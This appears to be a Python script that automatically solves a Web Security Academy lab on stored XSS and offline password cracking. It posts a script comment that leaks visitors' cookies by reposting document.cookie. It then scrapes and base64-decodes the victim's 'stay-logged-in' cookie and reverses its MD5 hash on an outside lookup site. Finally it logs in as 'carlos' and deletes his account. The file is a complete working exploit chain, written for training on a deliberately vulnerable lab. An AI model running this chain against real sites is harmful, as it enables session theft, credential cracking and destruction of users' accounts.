from web_security_academy.core.logger import logger
from bs4 import BeautifulSoup
from base64 import b64decode

import re


def solve_lab(session):
    # Part 1: Send XSS payload
    xss = [
        "<script>",
        "var xhr = new XMLHttpRequest();",
        'xhr.open("POST", "/post/comment", true);',
        'xhr.send("postId=1&comment=" + document.cookie + "&name=user&email=user@example.com&website=");',
        "</script>",
    ]
    logger.info("Exploiting XSS vulnerability by posting the following comment:")
    comment = "\n".join(xss)
    print(comment)

    data = {
        "postId": "2",
        "comment": comment,
        "name": "user",
        "email": "user@example.com",
        "website": "",
    }
    session.post_path("/post/comment", data=data)

    # Part 2: Extract Carlos's MD5 password hash
    logger.info("Extracting Carlos's stay-logged-in cookie...")
    resp = session.get_path("/post", params={"postId": 1})
    m = re.search(r"stay-logged-in=([A-Za-z0-9\+\/]+)", resp.text)

    if m is None:
        logger.failure("Unable to extract Carlos's stay-logged-in cookie.")
        return
    else:
        cookie = m.group(1)
        logger.success(f"stay-logged-in={cookie}")

    decoded = b64decode(cookie).decode()
    logger.info(f"Base64 decoded: {decoded}")
    carlos_hash = decoded.replace("carlos:", "")

    # Part 3: Offline password crack
    md5_center = "https://md5.gromweb.com/"
    logger.info(f'Reversing MD5 hash "{carlos_hash}" on "{md5_center}"...')
    resp = session.get(md5_center, params={"md5": carlos_hash})

    soup = BeautifulSoup(resp.text, "lxml")
    query = soup.select_one("#string")
    if query is None or query.get("value") is None:
        logger.failure("Unable to reverse MD5 hash.")
        return
    else:
        password = query.get("value")
        logger.success(f"Found password: {password}")

    session.login("carlos", password, with_csrf=False)
    logger.info("Deleting Carlos's account...")
    session.post_path("/my-account/delete", data={"password": password})
